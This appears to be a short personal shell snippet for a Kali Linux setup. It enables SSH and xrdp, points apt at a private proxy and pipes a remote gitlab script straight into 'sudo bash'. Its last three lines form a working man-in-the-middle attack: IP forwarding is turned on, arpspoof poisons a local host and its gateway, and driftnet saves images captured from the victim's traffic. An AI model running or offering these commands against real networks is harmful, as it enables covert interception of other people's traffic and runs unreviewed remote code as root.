```shell
sudo update-rc.d ssh enable
sudo sed -i.bak 's|http.kali.org|nexus.czy21.com/repository/apt-proxy|g' /etc/apt/sources.list
wget -O - https://gitlab.com/kalilinux/build-scripts/kali-wsl-chroot/-/raw/master/xfce4.sh | sudo bash
sudo update-rc.d xrdp enable

echo 1 >/proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.2.30 -r 192.168.2.1
driftnet -i eth0 -b -a -d /volume2/media/ -m 100
```